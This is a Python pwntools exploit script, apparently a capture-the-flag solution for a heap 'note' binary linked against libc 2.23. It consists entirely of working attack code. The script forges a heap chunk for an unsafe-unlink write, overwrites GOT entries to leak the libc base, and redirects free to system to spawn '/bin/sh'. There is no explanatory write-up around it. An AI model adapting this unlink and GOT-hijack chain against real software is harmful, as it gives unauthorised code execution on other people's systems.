from pwn import *
context.log_level = 'debug'
prog = './slientnote'
elf = ELF(prog)
p = process(prog)
libc = ELF("./libc-2.23.so")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

def add(idx, content):
	p.sendlineafter("4.Exit\n", '1')
	p.sendlineafter("2.Large\n", str(idx))
	p.sendlineafter("Content:\n", content)
def edit(idx, content):
	p.sendlineafter("4.Exit\n", '3')
	p.sendlineafter("2.Large\n", str(idx))
	p.sendlineafter("Content:\n", content)
def free(idx):
	p.sendlineafter("4.Exit\n", '2')
	p.sendlineafter("Large\n", str(idx))
def hack():
	p.sendlineafter("4.Exit\n", '1'*0x500)
def exp():
	ptr = 0x6020d0
	add(1, 'a')
	add(2, 'a')	
	free(1)
	hack()
	edit(1, p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0x20))
	free(2)
	edit(1, p64(0)*3+p64(elf.got['free'])+p64(elf.got['puts']))
	edit(1, p64(elf.plt['puts']))
	free(2)
	libc_base  = u64(p.recv(6)+'\x00'*2)-libc.sym['puts']
	edit(1, p64(libc_base + libc.sym['system']))
	add(2, '/bin/sh\x00')
	free(2)
	p.interactive()
if __name__ == '__main__':	
	exp()
